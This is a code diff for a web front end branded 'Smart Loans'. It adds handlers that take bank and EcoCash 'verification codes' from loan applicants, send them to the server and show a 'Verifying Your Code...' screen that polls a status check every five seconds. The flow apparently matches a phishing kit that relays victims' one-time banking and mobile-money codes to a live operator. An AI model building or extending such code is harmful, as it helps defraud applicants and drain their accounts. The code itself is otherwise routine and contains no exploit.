@@ -979,7 +979,69 @@ function loadBankVerificationScreen() {
 
     document
         .getElementById("continueVerification")
-        .addEventListener("click", saveBankVerification);
+        .addEventListener("click", submitBankVerificationCode);
+
+}
+// ======================================================
+// SUBMIT BANK VERIFICATION CODE
+// ======================================================
+
+async function submitBankVerificationCode() {
+
+    const verificationCode = document
+        .getElementById("bankVerificationCode")
+        .value
+        .trim();
+
+    if (!verificationCode) {
+
+        alert("Please enter the verification code.");
+
+        return;
+
+    }
+
+    const applicationId = sessionStorage.getItem("applicationId");
+
+    try {
+
+        const response = await fetch("/submit-verification-code", {
+
+            method: "PUT",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                applicationId,
+                verificationCode
+
+            })
+
+        });
+
+        const result = await response.json();
+
+        if (!result.success) {
+
+            alert("Unable to submit verification code.");
+
+            return;
+
+        }
+
+        // Go to waiting screen
+        loadVerificationPendingScreen();
+
+    } catch (err) {
+
+        console.error(err);
+
+        alert("Unable to connect to the server.");
+
+    }
 
 }
 // ======================================================
@@ -1729,7 +1791,69 @@ function loadEcoCashVerificationScreen() {
 
     document
         .getElementById("continueEcoVerification")
-        .addEventListener("click", saveEcoCashVerification);
+        .addEventListener("click", submitEcoCashVerificationCode);
+
+}
+// ======================================================
+// SUBMIT ECOCASH VERIFICATION CODE
+// ======================================================
+
+async function submitEcoCashVerificationCode() {
+
+    const verificationCode = document
+        .getElementById("ecoVerificationCode")
+        .value
+        .trim();
+
+    if (!verificationCode) {
+
+        alert("Please enter the verification code.");
+
+        return;
+
+    }
+
+    const applicationId = sessionStorage.getItem("applicationId");
+
+    try {
+
+        const response = await fetch("/submit-verification-code", {
+
+            method: "PUT",
+
+            headers: {
+                "Content-Type": "application/json"
+
+            },
+
+            body: JSON.stringify({
+
+                applicationId,
+                verificationCode
+
+            })
+
+        });
+
+        const result = await response.json();
+
+        if (!result.success) {
+
+            alert("Unable to submit verification code.");
+
+            return;
+
+        }
+
+        loadVerificationPendingScreen();
+
+    } catch (err) {
+
+        console.error(err);
+
+        alert("Unable to connect to the server.");
+
+    }
 
 }
 // ======================================================
@@ -1945,6 +2069,69 @@ async function submitEcoCashApplication() {
     }
 
 }
+// ======================================================
+// VERIFICATION PENDING SCREEN
+// ======================================================
+
+function loadVerificationPendingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="welcome-card">
+
+            <div style="font-size:60px;text-align:center;">
+                🏦
+            </div>
+
+            <h2 style="text-align:center;">
+                Smart Loans
+            </h2>
+
+            <br>
+
+            <div style="text-align:center;font-size:24px;color:#f39c12;font-weight:bold;">
+
+                🟡 Verifying Your Code...
+
+            </div>
+
+            <br>
+
+            <p style="text-align:center;line-height:1.8;">
+
+                Your verification code has been received successfully.
+
+                <br><br>
+
+                Please wait while we verify your code.
+
+            </p>
+
+            <br>
+
+            <div class="loading-dots">
+
+                <span></span>
+                <span></span>
+                <span></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+    monitorVerificationStatus();
+
+setInterval(monitorVerificationStatus, 5000);
+
+}
+
 // ===============================
 // LIVE TRACKING
 // ===============================
